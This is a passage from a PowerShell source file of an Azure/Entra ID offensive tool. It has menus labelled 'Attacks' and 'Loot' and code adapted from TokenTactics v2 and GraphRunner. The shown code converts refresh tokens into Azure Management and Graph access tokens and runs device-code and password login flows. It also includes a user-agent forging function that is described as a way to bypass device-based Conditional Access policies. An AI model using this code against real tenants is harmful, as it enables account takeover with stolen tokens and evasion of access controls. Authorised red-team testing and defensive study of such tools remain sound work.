SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
Using functions from TokenTactics v2 from Fabian Bader to convert Refresh Tokens to Access Tokens
https://github.com/f-bader/TokenTacticsV2
#>
function TokensMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Tokens Menu with Functions from Fabian Bader's TokenTactics v2" -ForegroundColor Cyan
        Write-Host "1. Invoke-RefreshToAzureManagementToken"
        Write-Host "2. Invoke-RefreshToAzureCoreManagementToken"
        Write-Host "3. Invoke-RefreshToGraphToken"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                Invoke-RefreshToAzureManagementToken
            }
            "2" {
                Invoke-RefreshToAzureCoreManagementToken
            }
            "3" {
                Invoke-RefreshToGraphToken
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

function Invoke-RefreshToToken {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $true)]
        [string]$refreshToken,
        [Parameter(Mandatory = $true)]
        [string]$ClientID,
        [Parameter(Mandatory = $true)]
        [string]$Scope,
        [Parameter(Mandatory = $false)]
        [string]$Resource,
        [Parameter(Mandatory = $False)]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE,
        [Parameter(Mandatory = $False)]
        [Switch]$UseDoD,
        [Parameter(Mandatory = $False)]
        [Switch]$UseV1Endpoint
    )

    if ($Device) {
        if ($Browser) {
            $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
        } else {
            $UserAgent = Invoke-ForgeUserAgent -Device $Device
        }
    } else {
        if ($Browser) {
            $UserAgent = Invoke-ForgeUserAgent -Browser $Browser
        } else {
            $UserAgent = Invoke-ForgeUserAgent
        }
    }

    Write-Verbose "UserAgent: $UserAgent"

    $Headers = @{}
    $Headers["User-Agent"] = $UserAgent

    $TenantId = $Global:tenantID
    if ($UseDoD) {
        $authUrl = "https://login.microsoftonline.us/$($TenantId)"
    } else {
        $authUrl = "https://login.microsoftonline.com/$($TenantId)"
    }


    Write-Verbose $refreshToken

    $body = @{
        "scope"         = $Scope
        "client_id"     = $ClientId
        "grant_type"    = "refresh_token"
        "refresh_token" = $refreshToken
    }

    if ($UseCAE) {
        # Add 'cp1' as client claim to get a access token valid for 24 hours
        $Claims = ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
        $body.Add("claims", $Claims)
    }

    if ($Resource) {
        $body.Add("resource", $Resource)
    }

    Write-Verbose ( $body | ConvertTo-Json -Depth 99)

    if ($UseV1Endpoint) {
        $uri = "$($authUrl)/oauth2/token"
    } else {
        $uri = "$($authUrl)/oauth2/v2.0/token"
    }

    $Token = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $uri -Headers $Headers -Body $body
    Return $Token
}

function Invoke-RefreshToAzureManagementToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Azure Management token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToAzureManagementToken -RefreshToken ey....
        $AzureManagementToken.access_token
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory = $true)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $false)]
        [Switch]$UseCAE
    )

    # Define initial parameters
    $Parameters = @{
        Domain       = $Global:tenantid
        refreshToken = $RefreshToken
        ClientID     = $ClientId
        UseCAE       = $UseCAE
        Scope        = "https://management.azure.com/.default offline_access openid"
    }

    # Device and Browser options
    $deviceOptions = @('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')
    $browserOptions = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')

    # Prompt user for custom headers
    Write-Host "Would you like to specify a custom Device and Browser header? (Y/N)" -ForegroundColor Yellow
    $customHeaders = Read-Host

    if ($customHeaders -eq "Y") {
        # Display device options
        Write-Host "Select Device:" -ForegroundColor Yellow
        for ($i = 0; $i -lt $deviceOptions.Count; $i++) {
            Write-Host "$($i + 1). $($deviceOptions[$i])"
        }
        $selectedDeviceIndex = Read-Host "Enter the number corresponding to the Device"
        $Parameters.Device = $deviceOptions[$selectedDeviceIndex - 1]

        # Display browser options
        Write-Host "Select Browser:" -ForegroundColor Yellow
        for ($i = 0; $i -lt $browserOptions.Count; $i++) {
            Write-Host "$($i + 1). $($browserOptions[$i])"
        }
        $selectedBrowserIndex = Read-Host "Enter the number corresponding to the Browser"
        $Parameters.Browser = $browserOptions[$selectedBrowserIndex - 1]
    }

    # Invoke the token retrieval function
    $Global:AzureManagementToken = Invoke-RefreshToToken @Parameters
    
    Write-Host ("Token acquired") -ForegroundColor Green
    Write-Host ("Type: $($AzureManagementToken.token_type)") -ForegroundColor Green
    Write-Host ("Scope: $($AzureManagementToken.scope)") -ForegroundColor Green
    Write-Host ("Expires in: $($AzureManagementToken.expires_in)") -ForegroundColor Green
    Write-Host ("FOCI: $($AzureManagementToken.foci)") -ForegroundColor Green
    Write-Host ("Access Token: $($AzureManagementToken.access_token)") -ForegroundColor DarkMagenta
    Pause
}

function Invoke-RefreshToAzureCoreManagementToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Azure Core Mangement token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToAzureCoreManagementToken -domain myclient.org -refreshToken ey....
        $AzureCoreManagementToken.access_token
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory = $true)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Global:tenantid
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://management.core.windows.net/.default offline_access openid"
    }

    # Device and Browser options
    $deviceOptions = @('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')
    $browserOptions = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')

    # Prompt user for custom headers
    Write-Host "Would you like to specify a custom Device and Browser header? (Y/N)" -ForegroundColor Yellow
    $customHeaders = Read-Host

    if ($customHeaders -eq "Y") {
        # Display device options
        Write-Host "Select Device:" -ForegroundColor Yellow
        for ($i = 0; $i -lt $deviceOptions.Count; $i++) {
            Write-Host "$($i + 1). $($deviceOptions[$i])"
        }
        $selectedDeviceIndex = Read-Host "Enter the number corresponding to the Device"
        $Parameters.Device = $deviceOptions[$selectedDeviceIndex - 1]

        # Display browser options
        Write-Host "Select Browser:" -ForegroundColor Yellow
        for ($i = 0; $i -lt $browserOptions.Count; $i++) {
            Write-Host "$($i + 1). $($browserOptions[$i])"
        }
        $selectedBrowserIndex = Read-Host "Enter the number corresponding to the Browser"
        $Parameters.Browser = $browserOptions[$selectedBrowserIndex - 1]
    }

    $global:AzureCoreManagementToken = Invoke-RefreshToToken @Parameters
        
    Write-Host ("Token acquired") -ForegroundColor Green
    Write-Host ("Type: $($AzureCoreManagementToken.token_type)") -ForegroundColor Green
    Write-Host ("Scope: $($AzureCoreManagementToken.scope)") -ForegroundColor Green
    Write-Host ("Expires in: $($AzureCoreManagementToken.expires_in)") -ForegroundColor Green
    Write-Host ("FOCI: $($AzureCoreManagementToken.foci)") -ForegroundColor Green
    Write-Host ("Access Token: $($AzureCoreManagementToken.access_token)") -ForegroundColor DarkMagenta
    Pause
}

function Invoke-RefreshToGraphToken {
    <#
    .DESCRIPTION
        Generate a windows graph token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToGraphToken -domain myclient.org -refreshToken ey....
        $GraphToken.access_token
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory = $true)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        [string]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Global:tenantID
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://graph.windows.net/.default offline_access openid"
    }

    # Device and Browser options
    $deviceOptions = @('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')
    $browserOptions = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')

    # Prompt user for custom headers
    Write-Host "Would you like to specify a custom Device and Browser header? (Y/N)" -ForegroundColor Yellow
    $customHeaders = Read-Host

    if ($customHeaders -eq "Y") {
        # Display device options
        Write-Host "Select Device:" -ForegroundColor Yellow
        for ($i = 0; $i -lt $deviceOptions.Count; $i++) {
            Write-Host "$($i + 1). $($deviceOptions[$i])"
        }
        $selectedDeviceIndex = Read-Host "Enter the number corresponding to the Device"
        $Parameters.Device = $deviceOptions[$selectedDeviceIndex - 1]

        # Display browser options
        Write-Host "Select Browser:" -ForegroundColor Yellow
        for ($i = 0; $i -lt $browserOptions.Count; $i++) {
            Write-Host "$($i + 1). $($browserOptions[$i])"
        }
        $selectedBrowserIndex = Read-Host "Enter the number corresponding to the Browser"
        $Parameters.Browser = $browserOptions[$selectedBrowserIndex - 1]
    }

    $global:GraphToken = Invoke-RefreshToToken @Parameters
    Write-Output "$([char]0x2713)  Token acquired and saved as `$GraphToken"
    $GraphToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    Write-Host ("Token acquired") -ForegroundColor Green
    Write-Host ("Type: $($GraphToken.token_type)") -ForegroundColor Green
    Write-Host ("Scope: $($GraphToken.scope)") -ForegroundColor Green
    Write-Host ("Expires in: $($GraphToken.expires_in)") -ForegroundColor Green
    Write-Host ("FOCI: $($GraphToken.foci)") -ForegroundColor Green
    Write-Host ("Access Token: $($GraphToken.access_token)") -ForegroundColor DarkMagenta
    Pause
}

# Main menu structure
function ToolMenu {
    ShowBanner
    preflightcheck
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Main Menu" -ForegroundColor Cyan
        Write-Host "1. Authentication"
        Write-Host "2. Queries"
        Write-Host "3. Attacks"
        Write-Host "4. Loot"
        Write-Host "5. Tokens"
        Write-Host "C. Check Tools and Updates"
        Write-Host "Q. Quit"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput.ToUpper()) {
            "1" {
                LoginMenu
            }
            "2" {
                QueriesMenu
            }
            "3" {
                AttacksMenu
            }
            "4" {
                LootMenu
            }
            "5" {
                TokensMenu
            }
            "C" {
                Clear-Host
                Write-Host "Checking installations and updates..."
                Check-AzureCLI
                Check-UpdateModule "Az"
                Check-UpdateModule "Microsoft.Graph"
                Write-Host "`nPress any key to return to the menu..."
                [void][System.Console]::ReadKey($true)
            }
            "Q" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to display the ASCII art banner
function ShowBanner {
    Clear-Host
    Write-Host "
                                                                                                
                                        .*#  #@-   .@@@@%+.                                      
                                  ..%@# -@@@.@%.   .@@: +@@.-@@#.                                
                             .:*@@+..#@%%@+@@@-    :@@##%#-.@@@:+@@..                            
                             %@@:*@=  +@@% =@@.    :@@.    =@@%@@: +@%                           
                        .-#@+.@@@:.=*. :-.                 +@@%=.  *@*.=%-.                      
                      .+@##@@..@@@@=.                       ...+*..@@@@@@@.                      
                     :@@@*@*.  .:.              +:         .*@    .%@#.@@-:%@-                   
                      :@@@+.                    #@%.       =@@.       -@@@@#.                    
                        =@@:                    +@@@.     =@@@:       .-=.                       
                         ..                     +@@@@@@@@@@@@@*.       ..                        
                            .                   +@@@%@@@@-..:@@.       -@%.                      
                           *@@-                 :@# ..-@@....@@.     .+@@-                       
                           .-@@@:               .@# . #@@@%%@@@.    .@@@..                       
                             .%@@@.             :@@@@@@@@@@@@@@.   -@@@%.                        
                             .*:@@@@-        .%@@@@@@@@@@@@@@@@- :@@@@@%.                        
                              .=@@@@@=    .+@@@@@@@@@@@@@@@@@@@@.#@@@@@:                         
                              .@@@@@@.  .*@@@@@@@@@@@@@@@@@@@@@@..@@@@@@:                        
                              #@@@@@@#++@@@@@@@@@@@@@@@@@@@@@@@@: *@@@@@=.                       
                               .=.:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=                          
                                    .=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+.                           
                                     #@@@@@@@@@@@@@@@@@@@@@@@@@@@@-.                             
                                    -@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                               
                   .=@@@@@@%:..     #@@@@@@@@@@@@@@@@@@@@@@@@@@@:                                
                   +@@@@@@@@@@@%.   @@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                     ....:*@@@@@@@..@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                            ..#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                               .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                .-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                  :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                   -@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                    *@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                    .-@@@@@@@@@@@@@@@@@@@@@@@@@.                                 
                                                                                                 
                      .%#..%%. .%#. =%%*:  .%*. =%%%= *%: .%-.#-  *%. .+%%-.*.                   
                      :@@#+@@:.#@@- #@:=@*.@@@- #@.. .@@@..@%@%. -@@# =@*:..%:                   
                      .@-@@=@::@%@@.#@--@#.@#@%.#@%*.@@@@=.@@@@. %@@@:..*@@-#.                   
                      .@.%+:@-*#.:@:#@@@*.@+.+@=*%  .@:.%%.@*.@@.@:.@#:@@@%.%.    

" -ForegroundColor Cyan
}

# Check PowerShell version
function preflightcheck {if ($PSVersionTable.PSVersion.Major -lt 7) {
                    Write-Host "You are running PowerShell version $($PSVersionTable.PSVersion). It is recommended to use PowerShell 7 or higher for optimal performance and compatibility with APEX." -ForegroundColor Red
                } else {
                    Write-Host "PowerShell version $($PSVersionTable.PSVersion) detected. You are running a compatible version of PowerShell for APEX." -ForegroundColor Green
                }

                # Check if Azure CLI is installed
                try {
                    az --version > $null
                    Write-Host "Azure CLI is installed." -ForegroundColor Green
                }
                catch {
                    Write-Host "Azure CLI is not installed." -ForegroundColor Red
                }
            
                # Check if Az PowerShell Module is available
                if (Get-Module -ListAvailable -Name Az) {
                    Write-Host "Az PowerShell Module is installed." -ForegroundColor Green
                } else {
                    Write-Host "Az PowerShell Module is not installed." -ForegroundColor Red
                }
                
                # Check if Microsoft Graph PowerShell Module is available
                if (Get-Module -ListAvailable -Name Microsoft.Graph) {
                    Write-Host "Microsoft Graph PowerShell Module is installed." -ForegroundColor Green
                } else {
                    Write-Host "Microsoft Graph PowerShell Module is not installed." -ForegroundColor Red
                }

Write-Host "`nPress any key to continue..."
[void][System.Console]::ReadKey($true)
}

<# 
Stolen and altered GraphRunner stuff
MIT License

Copyright (c) 2023 Beau Bullock

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
https://github.com/dafthack/GraphRunner
#>
function Get-GraphTokens{
    [CmdletBinding()]
    param(
    [Parameter(Position = 0,Mandatory=$False)]
    [switch]$ExternalCall,
    [Parameter(Position = 1,Mandatory=$False)]
    [switch]$UserPasswordAuth,
    [Parameter(Position = 2,Mandatory=$False)]
    [ValidateSet("Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","DODMSGraph","Custom","Substrate")]
    [String[]]$Client = "MSGraph",
    [Parameter(Position = 3,Mandatory=$False)]
    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
    [Parameter(Position = 4,Mandatory=$False)]
    [String]$Resource = "https://graph.microsoft.com",
    [Parameter(Position = 5,Mandatory=$False)]
    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
    [String]$Device,
    [Parameter(Position = 6,Mandatory=$False)]
    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
    [String]$Browser
    )
    if ($Device) {
		if ($Browser) {
			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
		}
		else {
			$UserAgent = Invoke-ForgeUserAgent -Device $Device
		}
	}
	else {
	   if ($Browser) {
			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
	   } 
	   else {
			$UserAgent = Invoke-ForgeUserAgent
	   }
	}
    if($UserPasswordAuth){
        Write-Host -ForegroundColor Yellow "[*] Initiating the User/Password authentication flow"
        
      
        $url = "https://login.microsoft.com/common/oauth2/token"
        $headers = @{
            "Accept" = "application/json"
            "Content-Type" = "application/x-www-form-urlencoded"
            "User-Agent" = $UserAgent
        }
        $body = "grant_type=password&password=$password&client_id=$ClientID&username=$username&resource=$Resource&client_info=1&scope=openid"


        try{
            Write-Host -ForegroundColor Yellow "[*] Trying to authenticate with the provided credentials"
            $tokens = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body

            if ($tokens) {
                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                $tokobj = $tokenArray | ConvertFrom-Json
                
                Write-Output "Decoded JWT payload:"
                $tokobj
                $baseDate = Get-Date -date "01-01-1970"
                $tokenExpire = $baseDate.AddSeconds($tokobj.exp).ToLocalTime()
                Write-Host -ForegroundColor Yellow "[!] Your access token is set to expire on: $tokenExpire"
                Write-Host -ForegroundColor Green "User Agent: $UserAgent"
            }
        } catch {
            $details = $_.ErrorDetails.Message | ConvertFrom-Json
            Write-Output $details.error
        }
        $global:tokens = $tokens
        if($ExternalCall){
            return $tokens
        }
    
    }
    else{
        If($tokens){
            $newtokens = $null
            while($newtokens -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] It looks like you already tokens set in your `$tokens variable. Are you sure you want to authenticate again?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Initiating device code login..."
                    $global:tokens = ""
                    $newtokens = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
        }

        $body = @{
            "client_id" =     $ClientID
            "resource" =      $Resource
        }
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        $authResponse = Invoke-RestMethod `
            -UseBasicParsing `
            -Method Post `
            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
            -Headers $Headers `
            -Body $body
        Write-Host -ForegroundColor yellow $authResponse.Message

        $continue = "authorization_pending"
        while ($continue) {
            $body = @{
                "client_id"   = $ClientID
                "grant_type"  = "urn:ietf:params:oauth:grant-type:device_code"
                "code"        = $authResponse.device_code
                "scope"       = "openid"
            }

            try {
                $tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body

                if ($tokens) {
                    $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
                    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
                    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                    $tokobj = $tokenArray | ConvertFrom-Json
                    $global:tenantid = $tokobj.tid
                    Write-Output "Decoded JWT payload:"
                    $tokobj
                    $baseDate = Get-Date -date "01-01-1970"
                    $tokenExpire = $baseDate.AddSeconds($tokobj.exp).ToLocalTime()
                    Write-Host -ForegroundColor Green 'Successful authentication with UserAgent $UserAgent)'
                    Write-Host -ForegroundColor Green 'Graph Access Token: $tokens.AccessToken'
                    Write-Host -ForegroundColor Yellow "[!] Your access token is set to expire on: $tokenExpire"
                    $continue = $null
                }
            } catch {
                $details = $_.ErrorDetails.Message | ConvertFrom-Json
                $continue = $details.error -eq "authorization_pending"
                Write-Output $details.error
            }

            if ($continue) {
                Start-Sleep -Seconds 3
            }
            else{
                $global:tokens = $tokens
                if($ExternalCall){
                    return $tokens
                }
            }
        }
    }
}

function Invoke-ForgeUserAgent
{
    <#
    .DESCRIPTION
        Forge the User-Agent when sending requests to the Microsoft API's. Useful for bypassing device specific Conditional Access Policies. Defaults to Windows Edge.
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device = "Windows",
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser = "Edge"
    )
    Process {
        if ($Device -eq 'Mac') {
            if ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/604.1 Edg/91.0.100.0'
            } elseif ($Browser -eq 'Safari') {
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
            } else {
                Write-Warning "Device platform not found, defaulting to macos/Safari"
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
            }
        } elseif ($Device -eq 'Windows') {
            if ($Browser -eq 'IE') {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
            } elseif ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
            } else {
                Write-Warning "Device platform not found, defaulting to Windows/Edge"
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
            }
        } elseif ($Device -eq 'AndroidMobile') {
            if ($Browser -eq 'Android') {
                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
            } elseif ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 EdgA/103.0.1264.71'
            } else {
                Write-Warning "Device platform not found, defaulting to Android/Chrome"
                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
            }
        } elseif ($Device -eq 'iPhone') {
            if ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.114 Mobile/15E148 Safari/604.1'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1'
            } elseif ($Browser -eq 'Safari') {
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
            } else {
                Write-Warning "Device platform not found, defaulting to iPhone/Safari"
                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
            }
        } elseif ($Device -eq 'Linux') {
            if ($Browser -eq 'Chrome') {
                $UserAgent = 'Mozilla/5.0 (M12; Linux X12-12) AppleWebKit/806.12 (KHTML, like Gecko) Ubuntu/23.04 Chrome/113.0.5672.63 Safari/16.4.1'
            } elseif ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.14) Gecko/2009090217 Ubuntu/9.04 (jaunty) Firefox/52.7.3'
            } elseif ($Browser -eq 'Edge') {
                $UserAgent = 'Mozilla/5.0 (Wayland; Linux x86_64; Surface) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Ubuntu/23.04 Edg/114.0.1823.43'
            } else {
                Write-Warning "Device platform not found, defaulting to Linux/Firefox"
                $UserAgent = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.14) Gecko/2009090217 Ubuntu/9.04 (jaunty) Firefox/52.7.3'
            }
        } elseif ($Device -eq 'OS/2') {
            if ($Browser -eq 'Firefox') {
                $UserAgent = 'Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:80.7.12) Gecko/20050922 Firefox/80.0.7'
            } else {
                Write-Warning "Device platform not found, defaulting to OS/2 Firefox"
                $UserAgent = 'Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:80.7.12) Gecko/20050922 Firefox/80.0.7'
            }
        } else {
            if ($Browser -eq 'Android') {
                Write-Warning "Device platform not found, defaulting to Android"
                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
            } elseif ($Browser -eq 'IE') {
                Write-Warning "Device platform not found, defaulting to Windows/IE"
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
            } elseif ($Browser -eq 'Chrome') {
                Write-Warning "Device platform not found, defaulting to macos/Chrome"
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
            } elseif ($Browser -eq 'Firefox') {
